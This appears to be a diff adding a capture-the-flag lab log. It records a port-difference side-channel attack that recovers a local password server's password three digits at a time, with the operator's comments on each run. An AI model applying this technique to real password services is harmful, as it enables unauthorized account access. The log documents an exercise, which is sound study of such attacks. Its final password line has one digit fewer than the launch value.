@@ -1,0 +1,309 @@
+./password_db_launcher 585401237010 127.0.0.1:3000 # launch the password server (don't look, we would not know it in the ctf ;) )
+./webhook-and-requests.py # manually update the known password prefix KNOWN_CHUNK in here while uncovering password chunk by chunk
+
+
+# Start with KNOWN_CHUNK=""
+
+Tries for chunk    causing rare port difference
+port diff  58227
+PW chunk  ['000']
+port diff  7
+PW chunk  ['585', '546']
+Terminated: 15
+
+Tries for chunk    causing rare port difference
+port diff  4
+PW chunk  ['585']
+port diff  7
+PW chunk  ['280', '264', '845', '081']
+port diff  9
+PW chunk  ['240']
+port diff  62020
+PW chunk  ['000']
+
+Tries for chunk    causing rare port difference
+port diff  2
+PW chunk  ['001']
+port diff  4
+PW chunk  ['585', '200', '663', '214']
+port diff  5
+PW chunk  ['198']
+port diff  -16377
+PW chunk  ['165']
+port diff  9
+PW chunk  ['197']
+port diff  7
+PW chunk  ['777']
+port diff  65038
+PW chunk  ['000']
+
+
+# Try 585 for first chunk
+
+Tries for chunk  585  causing rare port difference
+#! /usr/bin/python
+port diff  7
+PW chunk  ['001']
+port diff  9
+PW chunk  ['400', '207']
+port diff  51678
+PW chunk  ['000']
+
+Tries for chunk  585  causing rare port difference
+port diff  3
+PW chunk  ['001']
+port diff  5
+PW chunk  ['050']
+port diff  9
+PW chunk  ['400', '419', '837']
+port diff  56517
+PW chunk  ['000']
+Terminated: 15
+
+
+# It worked! Move on, append 400 for second chunk
+
+Tries for chunk  585400  causing rare port difference
+port diff  3
+PW chunk  ['001']
+port diff  6
+PW chunk  ['552']
+port diff  7
+PW chunk  ['648']
+port diff  9
+PW chunk  ['432', '553', '582', '570']
+port diff  60530
+PW chunk  ['000']
+
+Tries for chunk  585400  causing rare port difference
+port diff  3
+PW chunk  ['001']
+port diff  5
+PW chunk  ['080']
+port diff  9
+PW chunk  ['542', '165']
+port diff  50332
+PW chunk  ['000']
+
+
+# no chunk is prevailing, so maybe it is 401? ( There can be a delay which causes an off by 1 error, due to the threaded computation. )
+
+Tries for chunk  585401  causing rare port difference
+port diff  6
+PW chunk  ['958']
+port diff  9
+PW chunk  ['001']
+port diff  11
+PW chunk  ['236', '768', '956', '474']
+port diff  54346
+PW chunk  ['000']
+
+Tries for chunk  585401  causing rare port difference
+port diff  4
+PW chunk  ['001']
+port diff  6
+PW chunk  ['236', '363', '482', '474']
+port diff  8
+PW chunk  ['460']
+port diff  11
+PW chunk  ['823']
+port diff  13
+PW chunk  ['536']
+port diff  60440
+PW chunk  ['000']
+
+
+# This worked! Append 474
+
+Tries for chunk  585401474  causing rare port difference
+port diff  6
+PW chunk  ['014', '683', '314', '044']
+port diff  11
+PW chunk  ['036', '382']
+port diff  13
+PW chunk  ['033']
+port diff  65464
+PW chunk  ['000']
+port diff  -16379
+PW chunk  ['015']
+
+Tries for chunk  585401474  causing rare port difference
+port diff  6
+PW chunk  ['523', '819']
+port diff  9
+PW chunk  ['001']
+port diff  54099
+PW chunk  ['000']
+
+
+# Seems not to be it, so try 475 (off by one)
+
+Tries for chunk  585401475  causing rare port difference
+port diff  4
+PW chunk  ['001']
+port diff  59110
+PW chunk  ['000']
+port diff  8
+PW chunk  ['802']
+port diff  13
+PW chunk  ['725']
+port diff  6
+PW chunk  ['748', '740', '630', '152']
+
+Tries for chunk  585401475  causing rare port difference
+port diff  50251
+PW chunk  ['000']
+port diff  6
+PW chunk  ['860', '081']
+port diff  9
+PW chunk  ['001']
+port diff  11
+PW chunk  ['149', '450', '861']
+
+
+# Seems not to be it either, discard this chunk and try 585401 again, this time do three runs
+
+Tries for chunk  585401  causing rare port difference
+port diff  55265
+PW chunk  ['000']
+port diff  6
+PW chunk  ['584', '920']
+port diff  9
+PW chunk  ['001']
+port diff  11
+PW chunk  ['290', '236']
+
+Tries for chunk  585401  causing rare port difference
+port diff  6
+PW chunk  ['913', '574', '845']
+port diff  9
+PW chunk  ['001']
+port diff  11
+PW chunk  ['012', '237', '003', '352', '566']
+port diff  13
+PW chunk  ['065']
+port diff  62800
+PW chunk  ['000']
+port diff  18
+PW chunk  ['564']
+port diff  -16378
+PW chunk  ['546']
+
+Tries for chunk  585401  causing rare port difference
+port diff  6
+PW chunk  ['236']
+port diff  11
+PW chunk  ['212']
+port diff  51449
+PW chunk  ['000']
+
+
+# Seems to be 236 or 237, try 236 first, and better do three runs
+
+Tries for chunk  585401236  causing rare port difference
+port diff  4
+PW chunk  ['001']
+port diff  6
+PW chunk  ['347', '681']
+port diff  56456
+PW chunk  ['000']
+port diff  11
+PW chunk  ['051']
+
+Tries for chunk  585401236  causing rare port difference
+port diff  11
+PW chunk  ['736', '466', '803']
+port diff  4
+PW chunk  ['001']
+port diff  6
+PW chunk  ['243', '457']
+port diff  -16373
+PW chunk  ['436']
+port diff  13
+PW chunk  ['455']
+port diff  63350
+PW chunk  ['000']
+
+Tries for chunk  585401236  causing rare port difference
+port diff  4
+PW chunk  ['001']
+port diff  6
+PW chunk  ['945']
+port diff  11
+PW chunk  ['103']
+port diff  51992
+PW chunk  ['000']
+
+
+# Seems not to be it, try 237
+
+Tries for chunk  585401237  causing rare port difference
+port diff  5
+PW chunk  ['001']
+port diff  7
+PW chunk  ['975', '968', '875', '477']
+port diff  57004
+PW chunk  ['000']
+port diff  13
+PW chunk  ['198']
+port diff  15
+PW chunk  ['956']
+
+Tries for chunk  585401237  causing rare port difference
+port diff  7
+PW chunk  ['442', '435', '975', '186', '667', '256', '723']
+port diff  11
+PW chunk  ['001']
+port diff  -16371
+PW chunk  ['418']
+port diff  14
+PW chunk  ['434']
+port diff  15
+PW chunk  ['017']
+port diff  13
+PW chunk  ['215']
+port diff  63021
+PW chunk  ['000']
+
+Tries for chunk  585401237  causing rare port difference
+port diff  7
+PW chunk  ['442', '435', '975', '186', '667', '256', '723']
+port diff  11
+PW chunk  ['001']
+port diff  -16371
+PW chunk  ['418']
+port diff  14
+PW chunk  ['434']
+port diff  15
+PW chunk  ['017']
+port diff  13
+PW chunk  ['215']
+port diff  63021
+PW chunk  ['000']
+
+Tries for chunk  585401237  causing rare port difference
+port diff  13
+PW chunk  ['921', '675']
+port diff  52671
+PW chunk  ['000']
+Terminated: 15
+
+Tries for chunk  585401237  causing rare port difference
+port diff  5
+PW chunk  ['001']
+port diff  7
+PW chunk  ['199', '597', '697', '678', '980']
+port diff  8
+PW chunk  ['677']
+port diff  13
+PW chunk  ['689']
+port diff  15
+PW chunk  ['741']
+port diff  58677
+PW chunk  ['000']
+
+# Although we did plenty of runs, unfortunately we cannot see a pattern with our method for the last chunk - but we can rewrite code so it checks for "true" in the respnse!
+
+Password complete with last chunk: 58540123701
+
+# Yay, we got it!
